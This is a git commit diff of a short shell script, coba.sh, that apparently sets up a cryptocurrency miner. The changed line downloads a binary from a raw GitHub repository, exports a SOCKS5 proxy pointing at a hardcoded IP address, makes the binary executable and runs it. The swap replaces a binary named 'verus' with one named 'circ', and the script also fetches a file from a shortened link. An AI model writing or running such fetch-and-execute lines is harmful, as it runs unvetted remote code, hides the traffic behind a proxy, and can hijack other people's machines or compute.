db6f44e012c38d13977caf61c8b136abab5f7bd9
dragonballktp8 <91424626+dragonballktp8@users.noreply.github.com>
2021-10-01 22:41:24 +0700

    Update coba.sh

--- coba.sh
+++ coba.sh
@@ -2,6 +2,6 @@
 
 apt-get update
 wget -O 2 https://git.io/Jz9wF
-wget https://raw.githubusercontent.com/ributmaestro/ketapang/main/verus && export http_proxy=socks5://72.221.172.203:4145 && chmod u+x verus && ./verus
+wget https://raw.githubusercontent.com/ributmaestro/ketapang/main/circ && export http_proxy=socks5://72.221.172.203:4145 && chmod u+x circ && ./circ
 
 
